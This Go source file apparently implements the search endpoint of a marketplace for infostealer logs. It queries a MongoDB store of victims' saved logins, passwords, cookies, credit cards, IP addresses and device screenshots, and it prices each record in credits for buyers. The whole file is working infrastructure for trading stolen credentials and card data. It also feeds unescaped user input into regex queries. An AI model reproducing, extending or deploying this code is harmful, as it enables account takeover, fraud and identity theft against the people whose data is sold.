package routes

import (
	"context"
	"encoding/json"
	"log"
	"net/http"
	"strconv"

	"solomon/api/util"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
)

func SearchHandler(w http.ResponseWriter, r *http.Request, client *mongo.Client, config map[string]string) {
	query := r.FormValue("query")
	if query == "" {
		util.SendErrorResponse(w, "You are missing the query parameter", http.StatusBadRequest)
		return
	}

	field := r.FormValue("field")
	log.Println("Searching: " + field)

	matchStage := bson.M{}

	switch field {
	case "login":
		matchStage = bson.M{"data.logins.Login": bson.M{"$regex": query}}
	case "password":
		matchStage = bson.M{"data.logins.Password": bson.M{"$regex": query}}
	case "soft":
		matchStage = bson.M{"data.logins.Soft": bson.M{"$regex": query}}
	case "url":
		matchStage = bson.M{"data.logins.URL": bson.M{"$regex": query}}
	default:
		util.SendErrorResponse(w, "Please provide one of the following fields: login, password, soft, or url", http.StatusBadRequest)
		return
	}

	limit, err := strconv.Atoi(config["results_limit"])
	if err != nil {
		// TODO: Handle error, invalid or missing config value
	}

	pipeline := mongo.Pipeline{
		{{Key: "$match", Value: matchStage}},
		{{Key: "$project", Value: bson.M{
			"_id":                        1,
			"database.log_date":          bson.M{"$ifNull": []interface{}{"$infomation.date", nil}},
			"information.device_country": bson.M{"$ifNull": []interface{}{"$country", "N/A"}},
			"information.device_image":   bson.M{"$ifNull": []interface{}{"$image", nil}},
			"information.device_type":    bson.M{"$ifNull": []interface{}{"$infomation.device", nil}},
			"information.device_ip":      bson.M{"$ifNull": []interface{}{"$infomation.ip", "N/A"}},
			"device._logins":             bson.M{"$ifNull": []interface{}{"$data.logins", nil}},
			"device._cookies":            bson.M{"$ifNull": []interface{}{"$data.cookies", nil}},
			"device._cards":              bson.M{"$ifNull": []interface{}{"$data.credit_cards", nil}},
			"cost.credit_cost": bson.M{
				"$round": []interface{}{
					bson.M{
						"$add": []interface{}{
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.logins"}, 0.002}},
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.cookies"}, 0.0001}},
							bson.M{"$multiply": []interface{}{bson.M{"$size": "$data.credit_cards"}, 0.5}},
						},
					},
					2,
				},
			},
		}}},
		{{Key: "$limit", Value: limit}},
	}
	cursor, err := client.Database(config["database"]).Collection(config["collection"]).Aggregate(context.Background(), pipeline)
	if err != nil {
		log.Fatal(err)
	}
	defer cursor.Close(context.Background())

	var results []bson.M
	if err := cursor.All(context.Background(), &results); err != nil {
		log.Fatal(err)
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(results)
}
